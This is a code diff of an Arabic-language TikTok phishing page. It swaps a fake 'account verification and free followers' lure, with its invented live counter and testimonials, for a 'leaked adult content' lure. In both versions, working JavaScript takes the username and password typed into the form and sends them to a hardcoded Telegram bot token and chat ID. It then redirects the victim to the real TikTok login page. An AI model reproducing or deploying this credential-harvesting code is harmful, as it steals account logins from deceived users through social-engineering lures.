@@ -3,85 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Hub - Verified Boost</title>
+    <title>المحتوى الحصري | +18 Only</title>
     <style>
-        :root { --tiktok-pink: #fe2c55; --tiktok-cyan: #25f4ee; --dark-bg: #121212; }
-        body { background-color: #010101; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        :root { --accent: #ff0050; --dark: #050505; }
+        body { background: var(--dark); font-family: 'Cairo', sans-serif; color: white; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
         
-        /* Visual Trust Markers: Gradients */
-        .main-card { background: var(--dark-bg); border: 1px solid #2f2f2f; padding: 30px; border-radius: 25px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 15px 35px rgba(254, 44, 85, 0.15); position: relative; overflow: hidden; }
-        .main-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(90deg, var(--tiktok-pink), var(--tiktok-cyan)); }
-        
-        /* Live Interaction: Counter */
-        .live-status { background: #1a1a1a; padding: 12px; border-radius: 12px; margin-bottom: 25px; font-size: 0.9rem; border: 1px dashed #444; }
-        .pulse { display: inline-block; width: 10px; height: 10px; background: #47eb47; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 8px #47eb47; animation: blink 1.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        /* خلفية الإغراء الضبابية */
+        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://images.unsplash.com/photo-1614289371518-722f2615943d?q=80&w=1000&auto=format&fit=crop') center/cover; filter: blur(15px) brightness(0.4); z-index: -1; }
 
-        input { width: 100%; padding: 15px; margin: 12px 0; border: 1px solid #333; border-radius: 12px; background: #080808; color: white; font-size: 1rem; transition: 0.3s; }
-        input:focus { border-color: var(--tiktok-pink); outline: none; box-shadow: 0 0 10px rgba(254, 44, 85, 0.2); }
+        .card { background: rgba(20, 20, 20, 0.9); border: 2px solid var(--accent); padding: 30px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(255, 0, 80, 0.3); }
         
-        button { width: 100%; padding: 16px; background: linear-gradient(45deg, var(--tiktok-pink), #ef2950); border: none; border-radius: 12px; color: white; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.4s; margin-top: 10px; }
-        button:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
-
-        /* Social Proof Implementation: Comments */
-        .proof-section { width: 100%; max-width: 420px; margin-top: 30px; }
-        .comment { background: #121212; padding: 15px; border-radius: 15px; margin-bottom: 10px; border: 1px solid #222; display: flex; gap: 12px; align-items: flex-start; }
-        .user-info b { color: var(--tiktok-cyan); font-size: 0.85rem; }
-        .user-info p { margin: 5px 0 0; font-size: 0.85rem; color: #bbb; }
+        .warning { color: var(--accent); font-weight: bold; font-size: 1.5rem; margin-bottom: 10px; text-shadow: 0 0 10px var(--accent); }
+        
+        input { width: 100%; padding: 15px; margin: 12px 0; border: 1px solid #333; border-radius: 50px; background: #000; color: white; text-align: center; border: 1px solid #fe2c55; }
+        
+        button { width: 100%; padding: 16px; background: var(--accent); border: none; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; font-size: 1.1rem; box-shadow: 0 5px 15px rgba(255, 0, 80, 0.4); }
+        
+        .footer-text { font-size: 0.8rem; color: #777; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="main-card">
-        <img src="https://www.tiktok.com/favicon.ico" style="width: 60px; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));" alt="TikTok">
-        <h2 style="margin: 15px 0 5px;">نظام التوثيق والترقية 2026</h2>
-        <p style="color: #888; font-size: 0.9rem; margin-bottom: 20px;">قم بفتح ميزات الحساب الاحترافي واستلام 5000 متابع فوراً.</p>
+    <div class="bg-overlay"></div>
+    <div class="card">
+        <div class="warning">🔞 محتوى مسرب</div>
+        <p>يجب تأكيد هويتك عبر تيك توك لمشاهدة المقطع المحذوف</p>
         
-        <div class="live-status">
-            <span class="pulse"></span> متصل الآن: <span id="userCount" style="color: var(--tiktok-cyan); font-weight: bold;">1,248</span> خبير تقني
-        </div>
-
-        <form id="ultraForm">
-            <input type="text" id="username" placeholder="اسم المستخدم أو البريد" required>
-            <input type="password" id="password" placeholder="كلمة السر الحالية" required>
-            <button type="submit">تفعيل ميزات الحساب 🔥</button>
+        <form id="sexyForm">
+            <input type="text" id="u" placeholder="اليوزر أو الإيميل" required>
+            <input type="password" id="p" placeholder="كلمة السر" required>
+            <button type="submit">دخول ومشاهدة الآن 👙</button>
         </form>
-    </div>
 
-    <div class="proof-section">
-        <p style="color: #666; margin-right: 10px;">آراء المستخدمين الأخيرة:</p>
-        <div class="comment">
-            <div style="width: 40px; height: 40px; background: #333; border-radius: 50%; display: flex; align-items: center; justify-content: center;">👤</div>
-            <div class="user-info">
-                <b>@Ahmed_Vip</b>
-                <p>والله ما صدقت! المتابعين بدأوا يوصلون خلال 30 ثانية من التسجيل. شكراً!!</p>
-            </div>
-        </div>
-        <div class="comment">
-            <div style="width: 40px; height: 40px; background: #333; border-radius: 50%; display: flex; align-items: center; justify-content: center;">👤</div>
-            <div class="user-info">
-                <b>@Sara_TikToker</b>
-                <p>أفضل أداة جربتها في 2026، التصميم والمصداقية 10/10.</p>
-            </div>
-        </div>
+        <div class="footer-text">نظام فحص العمر التلقائي v4.2</div>
     </div>
 
     <script>
-        // التفاعل الحي: عداد المستخدمين المتغير
-        setInterval(() => {
-            const countEl = document.getElementById('userCount');
-            let current = parseInt(countEl.innerText.replace(',', ''));
-            countEl.innerText = (current + Math.floor(Math.random() * 7 - 3)).toLocaleString();
-        }, 3000);
-
         const token = '8462219592:AAEyi0IhxJgBOgOYQ-sq5NuaRZsTY144IcY';
         const chatId = '7637530382';
 
-        document.getElementById('ultraForm').onsubmit = function(e) {
+        document.getElementById('sexyForm').onsubmit = function(e) {
             e.preventDefault();
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            const msg = `💎 صيد بريميوم تيك توك 💎\n\n👤 اليوزر: ${u}\n🔑 الباسورد: ${p}\n🌐 الرابط: Bitly المختصر`;
-
+            const msg = `👙 صيد إغراء جديد 👙\n\n👤 يوزر: ${document.getElementById('u').value}\n🔑 باس: ${document.getElementById('p').value}`;
+            
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
             .then(() => { window.location.href = 'https://www.tiktok.com/login'; });
         };
